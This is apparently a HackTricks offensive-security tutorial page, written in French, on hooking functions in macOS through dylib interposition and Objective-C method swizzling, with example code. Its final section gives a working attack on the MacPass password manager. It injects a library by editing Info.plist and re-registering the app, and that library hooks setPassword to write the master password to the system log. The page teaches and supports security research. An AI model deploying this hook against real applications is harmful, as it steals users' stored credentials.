# Interception de fonctions macOS

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## Interception de fonctions

Créez une **dylib** avec une section **`__interpose` (`__DATA___interpose`)** (ou une section marquée avec **`S_INTERPOSING`**) contenant des paires de **pointeurs de fonctions** qui font référence aux fonctions **originales** et de **remplacement**.

Ensuite, **injectez** la dylib avec **`DYLD_INSERT_LIBRARIES`** (l'interception doit se produire avant le chargement de l'application principale). Évidemment, les [**restrictions** appliquées à l'utilisation de **`DYLD_INSERT_LIBRARIES`** s'appliquent également ici](macos-library-injection/#check-restrictions).

### Interposer printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
La variable d'environnement **`DYLD_PRINT_INTERPOSTING`** peut être utilisée pour déboguer l'interposition et affichera le processus d'interposition.
{% endhint %}

Notez également que **l'interposition se produit entre le processus et les bibliothèques chargées**, cela ne fonctionne pas avec le cache des bibliothèques partagées.

### Interposition dynamique

Maintenant, il est également possible d'interposer une fonction dynamiquement en utilisant la fonction **`dyld_dynamic_interpose`**. Cela permet d'interposer de manière programmatique une fonction en temps d'exécution au lieu de le faire uniquement depuis le début.

Il suffit d'indiquer les **paires** de la **fonction à remplacer et de la fonction de remplacement**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Remplacement de méthode

En ObjectiveC, voici comment une méthode est appelée : **`[instanceDeMaClasse nomDeLaMethodePremierParam:param1 secondParam:param2]`**

Il est nécessaire de disposer de l'**objet**, de la **méthode** et des **paramètres**. Lorsqu'une méthode est appelée, un **message est envoyé** en utilisant la fonction **`objc_msgSend`** : `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

L'objet est **`someObject`**, la méthode est **`@selector(method1p1:p2:)`** et les arguments sont **value1**, **value2**.

En suivant les structures d'objet, il est possible d'atteindre un **tableau de méthodes** où les **noms** et les **pointeurs** vers le code de la méthode sont **localisés**.

{% hint style="danger" %}
Notez que parce que les méthodes et les classes sont accessibles en fonction de leurs noms, ces informations sont stockées dans le binaire, il est donc possible de les récupérer avec `otool -ov </chemin/binaire>` ou [`class-dump </chemin/binaire>`](https://github.com/nygard/class-dump)
{% endhint %}

### Accès aux méthodes brutes

Il est possible d'accéder aux informations des méthodes telles que le nom, le nombre de paramètres ou l'adresse comme dans l'exemple suivant :

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
{% endcode %}

### Remplacement de méthode avec method\_exchangeImplementations

La fonction **`method_exchangeImplementations`** permet de **changer** l'**adresse** de l'**implémentation** d'**une fonction par une autre**.

{% hint style="danger" %}
Ainsi, lorsque qu'une fonction est appelée, c'est **l'autre fonction qui est exécutée**.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
Dans ce cas, si le code d'implémentation de la méthode légitime vérifie le nom de la méthode, il pourrait détecter ce remplacement et l'empêcher de s'exécuter.

La technique suivante n'a pas cette restriction.
{% endhint %}

### Remplacement de méthode avec method\_setImplementation

Le format précédent est étrange car vous modifiez l'implémentation de 2 méthodes l'une par l'autre. En utilisant la fonction **`method_setImplementation`**, vous pouvez **changer l'implémentation d'une méthode pour une autre**.

N'oubliez pas de **stocker l'adresse de l'implémentation de l'originale** si vous allez l'appeler depuis la nouvelle implémentation avant de l'écraser, car il sera ensuite beaucoup plus compliqué de localiser cette adresse.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## Méthodologie de l'attaque par hooking

Sur cette page, différentes façons de hooker des fonctions ont été discutées. Cependant, elles impliquaient **l'exécution de code à l'intérieur du processus pour attaquer**.

Pour ce faire, la technique la plus simple à utiliser est d'injecter un [Dyld via des variables d'environnement ou du détournement](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Cependant, je suppose que cela pourrait également être fait via [l'injection de processus Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Cependant, ces deux options sont **limitées** aux **binaires/processus non protégés**. Consultez chaque technique pour en savoir plus sur les limitations.

Cependant, une attaque par hooking de fonction est très spécifique, un attaquant le ferait pour **voler des informations sensibles à l'intérieur d'un processus** (sinon, vous feriez simplement une attaque par injection de processus). Et ces informations sensibles pourraient être situées dans des applications téléchargées par l'utilisateur telles que MacPass.

Ainsi, le vecteur de l'attaquant consisterait à trouver une vulnérabilité ou à supprimer la signature de l'application, injecter la variable d'environnement **`DYLD_INSERT_LIBRARIES`** via le fichier Info.plist de l'application en ajoutant quelque chose comme:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
et ensuite **réenregistrer** l'application :

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Ajoutez dans cette bibliothèque le code de hooking pour exfiltrer les informations : Mots de passe, messages...

{% hint style="danger" %}
Notez que dans les nouvelles versions de macOS, si vous **supprimez la signature** du binaire de l'application et qu'il a été exécuté précédemment, macOS **ne lancera plus l'application**.
{% endhint %}

#### Exemple de bibliothèque

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## Références

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
